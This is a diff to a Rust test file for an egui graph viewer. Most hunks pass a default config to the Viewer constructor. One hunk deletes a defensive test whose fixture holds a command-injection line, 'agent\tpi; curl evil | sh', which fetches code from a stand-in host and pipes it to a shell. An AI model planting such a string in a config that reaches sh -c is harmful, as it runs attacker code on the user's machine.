@@ -10,14 +10,14 @@ use std::path::PathBuf;
 use eframe::egui::Key;
 use egui_kittest::Harness;
 use egui_kittest::kittest::Queryable as _;
-use text_graph::{graph, vault};
+use text_graph::{config, graph, vault};
 
 use super::Viewer;
 
 fn harness() -> Harness<'static, Viewer> {
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let mut h = Harness::new_ui_state(
         |ui, v: &mut Viewer| {
             v.handle_keys(ui);
@@ -50,7 +50,7 @@ fn hover_dwell_renders_a_popup_with_the_file_body() {
     use std::time::{Duration, Instant};
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let mut h = Harness::new_ui_state(|ui, v: &mut Viewer| v.hover_preview_ui(ui), viewer);
     let id = h.state().g.by_path("index.md").expect("index exists");
     let since = Instant::now()
@@ -258,29 +258,6 @@ fn f_opens_the_picker_with_or_without_a_selection() {
     );
 }
 
-/// The view file is untrusted and the launch command runs through
-/// `sh -c` — a planted `agent\tpi; …` line must not survive restore
-/// (it sat behind the one-click Launch button and the `a` key).
-#[test]
-fn restored_default_agent_must_be_allowlisted() {
-    let d = std::env::temp_dir().join(format!("tg-agent-{}", std::process::id()));
-    let _ = std::fs::remove_dir_all(&d);
-    std::fs::create_dir_all(d.join(".text-graph")).unwrap();
-    std::fs::write(d.join("a.md"), "x").unwrap();
-    std::fs::write(
-        d.join(".text-graph/view"),
-        "text-graph view v1\nagent\tpi; curl evil | sh\n",
-    )
-    .unwrap();
-    let scan = vault::scan(&d).expect("scans");
-    let v = Viewer::new(graph::build(scan), d.clone());
-    let _ = std::fs::remove_dir_all(&d);
-    assert_eq!(
-        v.default_agent, "pi",
-        "non-allowlisted agent string falls back to the default"
-    );
-}
-
 /// A corrupt/hand-edited view file with a huge-but-finite camera center
 /// used to open onto a blank canvas: world_to_screen overflowed to ±inf,
 /// nothing painted or hit-tested, and fitted=true blocked the auto-fit
@@ -297,7 +274,7 @@ fn corrupt_view_state_camera_is_clamped_on_restore() {
     )
     .unwrap();
     let scan = vault::scan(&d).expect("scans");
-    let v = Viewer::new(graph::build(scan), d.clone());
+    let v = Viewer::new(graph::build(scan), d.clone(), config::Config::default());
     let _ = std::fs::remove_dir_all(&d);
     assert!(
         v.center.x.abs() <= 1e6 && v.center.y.abs() <= 1e6,
@@ -319,7 +296,7 @@ fn corrupt_view_state_camera_is_clamped_on_restore() {
 fn global_keys_do_not_fire_while_a_text_field_has_focus() {
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let mut buf = String::new();
     let mut h = Harness::new_ui_state(
         move |ui, v: &mut Viewer| {
@@ -541,7 +518,7 @@ fn a_reload_keeps_the_query_cursor_content_hits_and_preview() {
 fn picker_ui_renders_prompt_results_and_preview() {
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let mut h = Harness::new_ui_state(
         |ui, v: &mut Viewer| {
             v.pump_picker(ui.ctx());
@@ -611,7 +588,7 @@ fn an_empty_prompt_leaves_the_ranger_in_place_and_the_arrows_walk_it() {
 fn the_slash_that_opens_the_picker_does_not_land_in_the_prompt() {
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let mut h = Harness::new_ui_state(
         |ui, v: &mut Viewer| {
             v.handle_keys(ui);
@@ -647,7 +624,7 @@ fn the_slash_that_opens_the_picker_does_not_land_in_the_prompt() {
 fn tg_links_are_claimed_in_the_search_preview_too() {
     let root = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("fixtures/vault");
     let scan = vault::scan(&root).expect("fixture scans");
-    let viewer = Viewer::new(graph::build(scan), root);
+    let viewer = Viewer::new(graph::build(scan), root, config::Config::default());
     let target = viewer.g.by_path("topics/grafér.md").expect("target exists");
     let mut h = Harness::new_ui_state(
         move |ui, v: &mut Viewer| {
